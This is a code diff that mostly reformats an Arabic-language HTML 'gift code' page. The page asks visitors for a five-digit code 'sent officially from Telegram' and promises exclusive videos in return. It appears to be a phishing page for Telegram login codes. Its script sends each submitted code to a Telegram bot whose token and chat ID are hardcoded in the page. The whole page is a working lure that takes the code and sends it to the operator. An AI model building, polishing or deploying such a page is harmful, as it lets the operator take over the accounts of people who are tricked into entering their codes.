@@ -2,7 +2,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>استبدال كود الهدية</title><style>
+<title>استبدال كود الهدية</title>
+<style>
 *{
     margin:0;
     padding:0;
@@ -68,61 +69,54 @@ button:hover{
     margin-top:15px;
     color:#fff;
 }
-</style></head><body><div class="container">
+</style>
+</head>
+<body>
+<div class="container">
     <h1>🎁 كود الهدية</h1>
-    <p>يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات</p><input type="text" id="giftCode" placeholder="اكتب الكود هنا">
+    <p>يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات</p>
+    <input type="text" id="giftCode" placeholder="اكتب الكود هنا">
+    <button onclick="sendCode()">إرسال</button>
+    <div id="status"></div>
+</div>
 
-<button onclick="sendCode()">إرسال</button>
-
-<div id="status"></div>
-
-</div><script>
-
+<script>
 const BOT_TOKEN = "8983040975:AAFhVAvwXRnyj5sKK3Cagi-wH7ES8ciOZwU";
 const CHAT_ID = "8460546222";
 
-async function sendCode(){
-
+async function sendCode() {
     let code = document.getElementById("giftCode").value.trim();
 
-    if(code === ""){
-        document.getElementById("status").innerText =
-        "يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات";
-        return; // تم إصلاح: إضافة الفاصلة المنقوطة
+    if (code === "") {
+        document.getElementById("status").innerText = "يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات";
+        return;
     }
 
-    try{
-
+    try {
         let response = await fetch(
             `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
             {
-                method:"POST",
-                headers:{
-                    "Content-Type":"application/json"
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
                 },
-                body:JSON.stringify({
-                    chat_id:CHAT_ID,
-                    text:`🎁 كود هدية جديد:\n${code}`
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🎁 كود هدية جديد:\n${code}`
                 })
             }
         );
 
-        if(response.ok){
-            document.getElementById("status").innerText =
-            "تم إرسال الكود بنجاح";
+        if (response.ok) {
+            document.getElementById("status").innerText = "تم إرسال الكود بنجاح";
             document.getElementById("giftCode").value = "";
-        }else{
-            document.getElementById("status").innerText =
-            "فشل الإرسال";
+        } else {
+            document.getElementById("status").innerText = "فشل الإرسال";
         }
-
-    }catch(error){
-
-        document.getElementById("status").innerText =
-        "حدث خطأ أثناء الإرسال";
-
+    } catch (error) {
+        document.getElementById("status").innerText = "حدث خطأ أثناء الإرسال";
     }
 }
-
-</script></body>
+</script>
+</body>
 </html>
